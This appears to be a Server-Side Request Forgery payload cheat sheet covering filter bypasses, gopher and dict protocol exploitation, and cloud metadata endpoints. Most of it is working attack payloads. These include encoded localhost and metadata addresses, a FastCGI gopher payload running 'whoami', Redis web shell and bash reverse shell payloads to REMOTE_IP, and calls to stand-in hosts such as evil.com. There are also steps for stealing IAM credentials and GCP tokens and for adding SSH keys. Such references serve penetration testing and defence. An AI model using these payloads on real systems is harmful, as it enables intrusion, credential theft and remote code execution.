# Server-Side Request Forgery

> Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.

## Tools

* [swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap) - Automatic SSRF fuzzer and exploitation tool
* [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) - Generates gopher link for exploiting SSRF and gaining RCE in various servers
* [In3tinct/See-SURF](https://github.com/In3tinct/See-SURF) - Python based scanner to find potential SSRF parameters
* [teknogeek/SSRF-Sheriff](https://github.com/teknogeek/ssrf-sheriff) - Simple SSRF-testing sheriff written in Go
* [assetnote/surf](https://github.com/assetnote/surf) - Returns a list of viable SSRF candidates
* [dwisiswant0/ipfuscator](https://github.com/dwisiswant0/ipfuscator) - A blazing-fast, thread-safe, straightforward and zero memory allocations tool to swiftly generate alternative IP(v4) address representations in Go.
* [Horlad/r3dir](https://github.com/Horlad/r3dir) - a redirection service designed to help bypass SSRF filters that do not validate the redirect location. Intergrated with Burp with help of Hackvertor tags

## Methodology

SSRF is a security vulnerability that occurs when an attacker manipulates a server to make HTTP requests to an unintended location. This happens when the server processes user-provided URLs or IP addresses without proper validation.

Common exploitation paths:

* Accessing Cloud metadata
* Leaking files on the server
* Network discovery, port scanning with the SSRF
* Sending packets to specific services on the network, usually to achieve a Remote Command Execution on another server

**Example**: A server accepts user input to fetch a URL.

```py
url = input("Enter URL:")
response = requests.get(url)
return response
```

An attacker supplies a malicious input:

```ps1
http://169.254.169.254/latest/meta-data/
```

This fetches sensitive information from the AWS EC2 metadata service.

## Bypassing Filters

### Default Targets

By default, Server-Side Request Forgery are used to access services hosted on `localhost` or hidden further on the network.

* Using `localhost`

  ```powershell
  http://localhost:80
  http://localhost:22
  https://localhost:443
  ```

* Using `127.0.0.1`

  ```powershell
  http://127.0.0.1:80
  http://127.0.0.1:22
  https://127.0.0.1:443
  ```

* Using `0.0.0.0`

  ```powershell
  http://0.0.0.0:80
  http://0.0.0.0:22
  https://0.0.0.0:443
  ```

### Bypass Localhost with IPv6 Notation

* Using unspecified address in IPv6 `[::]`

    ```powershell
    http://[::]:80/
    ```

* Using IPv6 loopback addres`[0000::1]`

    ```powershell
    http://[0000::1]:80/
    ```

* Using [IPv6/IPv4 Address Embedding](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)

    ```powershell
    http://[0:0:0:0:0:ffff:127.0.0.1]
    http://[::ffff:127.0.0.1]
    ```

### Bypass Localhost with a Domain Redirect

| Domain                       | Redirect to |
|------------------------------|-------------|
| localtest.me                 | `::1`       |
| localh.st                    | `127.0.0.1` |
| spoofed.[BURP_COLLABORATOR]  | `127.0.0.1` |
| spoofed.redacted.oastify.com | `127.0.0.1` |
| company.127.0.0.1.nip.io     | `127.0.0.1` |

The service `nip.io` is awesome for that, it will convert any ip address as a dns.

```powershell
NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
```

### Bypass Localhost with CIDR

The IP range `127.0.0.0/8` in IPv4 is reserved for loopback addresses.

```powershell
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

If you try to use any address in this range (127.0.0.2, 127.1.1.1, etc.) in a network, it will still resolve to the local machine

### Bypass Using Rare Address

You can short-hand IP addresses by dropping the zeros

```powershell
http://0/
http://127.1
http://127.0.1
```

### Bypass Using an Encoded IP Address

* Decimal IP location

    ```powershell
    http://2130706433/ = http://127.0.0.1
    http://3232235521/ = http://192.168.0.1
    http://3232235777/ = http://192.168.1.1
    http://2852039166/ = http://169.254.169.254
    ```

* Octal IP: Implementations differ on how to handle octal format of IPv4.

    ```powershell
    http://0177.0.0.1/ = http://127.0.0.1
    http://o177.0.0.1/ = http://127.0.0.1
    http://0o177.0.0.1/ = http://127.0.0.1
    http://q177.0.0.1/ = http://127.0.0.1
    ```

* Hex IP

    ```powershell
    http://0x7f000001 = http://127.0.0.1
    http://0xc0a80101 = http://192.168.1.1
    http://0xa9fea9fe = http://169.254.169.254
    ```

### Bypass Using Different Encoding

* URL encoding: Single or double encode a specific URL to bypass blacklist

    ```powershell
    http://127.0.0.1/%61dmin
    http://127.0.0.1/%2561dmin
    ```

* Enclosed alphanumeric: `①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿`

    ```powershell
    http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
    ```

* Unicode encoding: In some languages (.NET, Python 3) regex supports unicode by default. `\d` includes `0123456789` but also `๐๑๒๓๔๕๖๗๘๙`.

### Bypassing via ipv6 hostname

* in Linux /etc/hosts contain this line `::1   localhost ip6-localhost ip6-loopback` but work only if http server running in ipv6

   ```powershell
   http://ip6-localhost = ::1
   http://ip6-loopback = ::1
   ```

### Bypassing Using a Redirect

1. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. 192.168.0.1)
2. Launch the SSRF pointing to `vulnerable.com/index.php?url=http://redirect-server`
3. You can use response codes [HTTP 307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307) and [HTTP 308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308) in order to retain HTTP method and body after the redirection.

To perform redirects without hosting own redirect server or perform seemless redirect target fuzzing, use [Horlad/r3dir](https://github.com/Horlad/r3dir).

* Redirects to `http://localhost` with `307 Temporary Redirect` status code

    ```powershell
    https://307.r3dir.me/--to/?url=http://localhost
    ```

* Redirects to `http://169.254.169.254/latest/meta-data/` with `302 Found` status code

    ```powershell
    https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me
    ```

### Bypass Using DNS Rebinding

Create a domain that change between two IPs.

* [1u.ms](http://1u.ms) - DNS rebinding utility

For example to rotate between `1.2.3.4` and `169.254-169.254`, use the following domain:

```powershell
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

Verify the address with `nslookup`.

```ps1
$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 1.2.3.4

$ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
Address: 169.254.169.254
```

### Bypass Abusing URL Parsing Discrepancy

[A New Era Of SSRF Exploiting URL Parser In Trending Programming Languages - Research from Orange Tsai](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

```powershell
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http:127.0.0.1/
```

Parsing behavior by different libraries: `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/`.

* `urllib2` treats `1.1.1.1` as the destination
* `requests` and browsers redirect to `2.2.2.2`
* `urllib` resolves to `3.3.3.3`
* Some parsers replace `http:127.0.0.1/` to `http://127.0.0.1/`

### Bypass PHP filter_var() Function

In PHP 7.0.25, `filter_var()` function with the parameter `FILTER_VALIDATE_URL` allows URL such as:

* `http://test???test.com`
* `0://evil.com:80;http://google.com:80/`

```php
<?php 
 echo var_dump(filter_var("http://test???test.com", FILTER_VALIDATE_URL));
 echo var_dump(filter_var("0://evil.com;google.com", FILTER_VALIDATE_URL));
?>
```

### Bypass Using JAR Scheme

This attack technique is fully blind, you won't see the result.

```powershell
jar:scheme://domain/path!/ 
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
```

## Exploitation via URL Scheme

### File

Allows an attacker to fetch the content of a file on the server. Transforming the SSRF into a file read.

```powershell
file:///etc/passwd
file://\/\/etc/passwd
```

### HTTP

Allows an attacker to fetch any content from the web, it can also be used to scan ports.

```powershell
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
```

### Dict

The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:

```powershell
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

### SFTP

A network protocol used for secure file transfer over secure shell

```powershell
ssrf.php?url=sftp://evil.com:11111/
```

### TFTP

Trivial File Transfer Protocol, works over UDP

```powershell
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

### LDAP

Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.

```powershell
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```

### Netdoc

Wrapper for Java when your payloads struggle with "`\n`" and "`\r`" characters.

```powershell
ssrf.php?url=netdoc:///etc/passwd
```

### Gopher

The `gopher://` protocol is a lightweight, text-based protocol that predates the modern World Wide Web. It was designed for distributing, searching, and retrieving documents over the Internet.

```ps1
gopher://[host]:[port]/[type][selector]
```

This scheme is very useful as it as be used to send data to TCP protocol.

```ps1
gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
```

Refer to the SSRF Advanced Exploitation to explore the `gopher://` protocol deeper.

## Blind Exploitation

> When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read.

Use an SSRF chain to gain an Out-of-Band output: [assetnote/blind-ssrf-chains](https://github.com/assetnote/blind-ssrf-chains)

**Possible via HTTP(s)**:

* [Elasticsearch](https://github.com/assetnote/blind-ssrf-chains#elasticsearch)
* [Weblogic](https://github.com/assetnote/blind-ssrf-chains#weblogic)
* [Hashicorp Consul](https://github.com/assetnote/blind-ssrf-chains#consul)
* [Shellshock](https://github.com/assetnote/blind-ssrf-chains#shellshock)
* [Apache Druid](https://github.com/assetnote/blind-ssrf-chains#druid)
* [Apache Solr](https://github.com/assetnote/blind-ssrf-chains#solr)
* [PeopleSoft](https://github.com/assetnote/blind-ssrf-chains#peoplesoft)
* [Apache Struts](https://github.com/assetnote/blind-ssrf-chains#struts)
* [JBoss](https://github.com/assetnote/blind-ssrf-chains#jboss)
* [Confluence](https://github.com/assetnote/blind-ssrf-chains#confluence)
* [Jira](https://github.com/assetnote/blind-ssrf-chains#jira)
* [Other Atlassian Products](https://github.com/assetnote/blind-ssrf-chains#atlassian-products)
* [OpenTSDB](https://github.com/assetnote/blind-ssrf-chains#opentsdb)
* [Jenkins](https://github.com/assetnote/blind-ssrf-chains#jenkins)
* [Hystrix Dashboard](https://github.com/assetnote/blind-ssrf-chains#hystrix)
* [W3 Total Cache](https://github.com/assetnote/blind-ssrf-chains#w3)
* [Docker](https://github.com/assetnote/blind-ssrf-chains#docker)
* [Gitlab Prometheus Redis Exporter](https://github.com/assetnote/blind-ssrf-chains#redisexporter)

**Possible via Gopher**:

* [Redis](https://github.com/assetnote/blind-ssrf-chains#redis)
* [Memcache](https://github.com/assetnote/blind-ssrf-chains#memcache)
* [Apache Tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat)

## Upgrade to XSS

When the SSRF doesn't have any critical impact, the network is segmented and you can't reach other machine, the SSRF doesn't allow you to exfiltrate files from the server.

You can try to upgrade the SSRF to an XSS, by including an SVG file containing Javascript code.

```bash
https://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg
```


---

# SSRF Advanced Exploitation

> Some services (e.g., Redis, Elasticsearch) allow unauthenticated data writes or command execution when accessed directly. An attacker could exploit SSRF to interact with these services, injecting malicious payloads like web shells or manipulating application state.

## DNS AXFR

Query an internal DNS resolver to trigger a full zone transfer (**AXFR**) and exfiltrate a list of subdomains.

```py
from urllib.parse import quote
domain,tld = "example.lab".split('.')
dns_request =  b"\x01\x03\x03\x07"    # BITMAP
dns_request += b"\x00\x01"            # QCOUNT
dns_request += b"\x00\x00"            # ANCOUNT
dns_request += b"\x00\x00"            # NSCOUNT
dns_request += b"\x00\x00"            # ARCOUNT
dns_request += len(domain).to_bytes() # LEN DOMAIN
dns_request += domain.encode()        # DOMAIN
dns_request += len(tld).to_bytes()    # LEN TLD
dns_request += tld.encode()           # TLD
dns_request += b"\x00"                # DNAME EOF
dns_request += b"\x00\xFC"            # QTYPE AXFR (252)
dns_request += b"\x00\x01"            # QCLASS IN (1)
dns_request = len(dns_request).to_bytes(2, byteorder="big") + dns_request
print(f'gopher://127.0.0.1:25/_{quote(dns_request)}')
```

Example of payload for `example.lab`: `gopher://127.0.0.1:25/_%00%1D%01%03%03%07%00%01%00%00%00%00%00%00%07example%03lab%00%00%FC%00%01`

```ps1
curl -s -i -X POST -d 'url=gopher://127.0.0.1:53/_%2500%251d%25a9%25c1%2500%2520%2500%2501%2500%2500%2500%2500%2500%2500%2507%2565%2578%2561%256d%2570%256c%2565%2503%256c%2561%2562%2500%2500%25fc%2500%2501' http://localhost:5000/ssrf --output - | xxd
```

## FastCGI

Requires to know the full path of one PHP file on the server, by default the exploit is using `/usr/share/php/PEAR.php`.

```ps1
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/usr/share/php/PEAR.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3F%3E%00%00%00%00
```

## Memcached

Memcached communicates over port 11211 by default. While it is primarily used for storing serialized data to enhance application performance, vulnerabilities can arise during the deserialization of this data.

```ps1
python2.7 ./gopherus.py --exploit pymemcache
python2.7 ./gopherus.py --exploit rbmemcache
python2.7 ./gopherus.py --exploit phpmemcache
python2.7 ./gopherus.py --exploit dmpmemcache
```

## MySQL

MySQL user should not be password protected.

```ps1
$ python2.7 ./gopherus.py --exploit mysql
Give MySQL username: root
Give query to execute: SELECT 123;

gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%0c%00%00%00%03%53%45%4c%45%43%54%20%31%32%33%3b%01%00%00%00%01
```

## Redis

> Redis is a database system that stores everything in RAM

The attacker changes Redis's dump directory to the web server's document root (`/var/www/html`) and renames the dump file to `file.php`, ensuring that when the database is saved, it generates a PHP file. They then create a Redis key (`mykey`) containing the web shell code, which enables remote command execution via HTTP GET parameters. Finally, the `SAVE` command forces Redis to write the current in-memory database to disk, resulting in the creation of the malicious web shell at `/var/www/html/file.php`.

```ps1
CONFIG SET dir /var/www/html
CONFIG SET dbfilename file.php
SET mykey "<?php system($_GET[0])?>"
SAVE
```

* Getting a webshell with `dict://`

    ```powershell
    dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
    dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
    dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
    dict://127.0.0.1:6379/SAVE
    ```

* Getting a PHP reverse shell with `gopher://`

    ```powershell
    gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
    gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
    gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
    gopher://127.0.0.1:6379/_save
    ```

## SMTP

Malicious actors can craft `gopher://` URLs to manipulate low-level protocols (like HTTP or SMTP) on internal systems.

```ps1
gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
```

The following PHP script can be used to generate a page that will redirect to the `gopher://` payload.

```php
<?php
    $commands = array(
            'HELO victim.com',
            'MAIL FROM: <admin@victim.com>',
            'RCPT To: <hacker@attacker.com>',
            'DATA',
            'Subject: @hacker!',
            'Hello Friend',
            '.'
    );
    $payload = implode('%0A', $commands);
    header('Location: gopher://0:25/_'.$payload);
?>
```

## WSGI

Exploit using the Gopher protocol, full exploit script available at [wofeiwo/webcgi-exploits/uwsgi_exp.py](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py).

```powershell
gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
```

| Header    |           |             |
|-----------|-----------|-------------|
| modifier1 | (1 byte)  | 0 (%00)     |
| datasize  | (2 bytes) | 26 (%1A%00) |
| modifier2 | (1 byte)  | 0 (%00)     |

| Variable (UWSGI_FILE) |           |    |                |
|-----------------------|-----------|----|----------------|
| key length            | (2 bytes) | 10 | (%0A%00)       |
| key data              | (m bytes) |    | UWSGI_FILE     |
| value length          | (2 bytes) | 12 | (%0C%00)       |
| value data            | (n bytes) |    | /tmp/test.py   |

## Zabbix

If `EnableRemoteCommands=1` is enabled in the Zabbix Agent configuration, it allows the execution of remote commands.

```ps1
gopher://127.0.0.1:10050/_system.run%5B%28id%29%3Bsleep%202s%5D
```


---

# SSRF URL for Cloud Instances

> When exploiting Server-Side Request Forgery (SSRF) in cloud environments, attackers often target metadata endpoints to retrieve sensitive instance information (e.g., credentials, configurations). Below is a categorized list of common URLs for various cloud and infrastructure providers

## SSRF URL for AWS

The AWS Instance Metadata Service is a service available within Amazon EC2 instances that allows those instances to access metadata about themselves. - [Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)

* IPv4 endpoint (old): `http://169.254.169.254/latest/meta-data/`
* IPv4 endpoint (new) requires the header `X-aws-ec2-metadata-token`

  ```powershell
  export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token"`
  curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta-data"
  ```

* IPv6 endpoint: `http://[fd00:ec2::254]/latest/meta-data/`

In case of a WAF, you might want to try different ways to connect to the API.

* DNS record pointing to the AWS API IP

  ```powershell
  http://instance-data
  http://169.254.169.254
  http://169.254.169.254.nip.io/
  ```

* HTTP redirect

  ```powershell
  Static:http://nicob.net/redir6a
  Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
  ```

* Encoding the IP to bypass WAF

  ```powershell
  http://425.510.425.510 Dotted decimal with overflow
  http://2852039166 Dotless decimal
  http://7147006462 Dotless decimal with overflow
  http://0xA9.0xFE.0xA9.0xFE Dotted hexadecimal
  http://0xA9FEA9FE Dotless hexadecimal
  http://0x41414141A9FEA9FE Dotless hexadecimal with overflow
  http://0251.0376.0251.0376 Dotted octal
  http://0251.00376.000251.0000376 Dotted octal with padding
  http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)
  http://[::ffff:a9fe:a9fe] IPV6 Compressed
  http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded
  http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4
  http://[fd00:ec2::254] IPV6
  ```

These URLs return a list of IAM roles associated with the instance. You can then append the role name to this URL to retrieve the security credentials for the role.

```powershell
http://169.254.169.254/latest/meta-data/iam/security-credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
```

This URL is used to access the user data that was specified when launching the instance. User data is often used to pass startup scripts or other configuration information into the instance.

```powershell
http://169.254.169.254/latest/user-data
```

Other URLs to query to access various pieces of metadata about the instance, like the hostname, public IPv4 address, and other properties.

```powershell
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**Examples**:

* Jira SSRF leading to AWS info disclosure - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`
* *Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`

## SSRF URL for AWS ECS

If you have an SSRF with file system access on an ECS instance, try extracting `/proc/self/environ` to get UUID.

```powershell
curl http://169.254.170.2/v2/credentials/<UUID>
```

This way you'll extract IAM keys of the attached role

## SSRF URL for AWS Elastic Beanstalk

We retrieve the `accountId` and `region` from the API.

```powershell
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

We then retrieve the `AccessKeyId`, `SecretAccessKey`, and `Token` from the API.

```powershell
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```

Then we use the credentials with `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.

## SSRF URL for AWS Lambda

AWS Lambda provides an HTTP API for custom runtimes to receive invocation events from Lambda and send response data back within the Lambda execution environment.

```powershell
http://localhost:9001/2018-06-01/runtime/invocation/next
http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next
```

Docs: <https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-next>

## SSRF URL for Google Cloud

:warning: Google is shutting down support for usage of the **v1 metadata service** on January 15.

Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"

```powershell
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

Google allows recursive pulls

```powershell
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```

Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)

```powershell
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

Required headers can be set using a gopher SSRF with the following technique

```powershell
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

Interesting files to pull out:

* SSH Public Key : `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`
* Get Access Token : `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
* Kubernetes Key : `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`

### Add an SSH key

Extract the token

```powershell
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

Check the scope of the token

```powershell
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  

{ 
        "issued_to": "101302079XXXXX", 
        "audience": "10130207XXXXX", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
```

Now push the SSH key.

```powershell
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
-H "Content-Type: application/json" 
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

## SSRF URL for Digital Ocean

Documentation available at `https://developers.digitalocean.com/documentation/metadata/`

```powershell
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

All in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```

## SSRF URL for Packetcloud

Documentation available at `https://metadata.packet.net/userdata`

## SSRF URL for Azure

Limited, maybe more exists? `https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/`

```powershell
http://169.254.169.254/metadata/v1/maintenance
```

Update Apr 2017, Azure has more support; requires the header "Metadata: true" `https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service`

```powershell
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

## SSRF URL for OpenStack/RackSpace

(header required? unknown)

```powershell
http://169.254.169.254/openstack
```

## SSRF URL for HP Helion

(header required? unknown)

```powershell
http://169.254.169.254/2009-04-04/meta-data/ 
```

## SSRF URL for Oracle Cloud

```powershell
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

## SSRF URL for Alibaba

```powershell
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

## SSRF URL for Hetzner Cloud

```powershell
http://169.254.169.254/hetzner/v1/metadata
http://169.254.169.254/hetzner/v1/metadata/hostname
http://169.254.169.254/hetzner/v1/metadata/instance-id
http://169.254.169.254/hetzner/v1/metadata/public-ipv4
http://169.254.169.254/hetzner/v1/metadata/private-networks
http://169.254.169.254/hetzner/v1/metadata/availability-zone
http://169.254.169.254/hetzner/v1/metadata/region
```

## SSRF URL for Kubernetes ETCD

Can contain API keys and internal ip and ports

```powershell
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```

## SSRF URL for Docker

```powershell
http://127.0.0.1:2375/v1.24/containers/json

Simple example
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```

More info:

* Daemon socket option: <https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option>
* Docker Engine API: <https://docs.docker.com/engine/api/latest/>

## SSRF URL for Rancher

```powershell
curl http://rancher-metadata/<version>/<path>
```

More info: <https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/>
